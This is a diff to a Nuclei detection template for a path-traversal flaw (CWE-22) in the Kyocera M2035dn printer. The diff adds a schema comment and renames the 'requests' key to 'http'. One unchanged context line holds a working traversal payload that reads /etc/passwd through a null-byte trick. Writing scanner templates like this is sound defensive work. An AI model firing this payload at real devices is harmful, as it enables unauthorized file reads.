@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: kyocera-m2035dn-lfi
 
 info:
@@ -14,7 +15,7 @@ info:
     cwe-id: CWE-22
   tags: printer,iot,kyocera,lfi
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/js/../../../../../../../../etc/passwd%00.jpg"
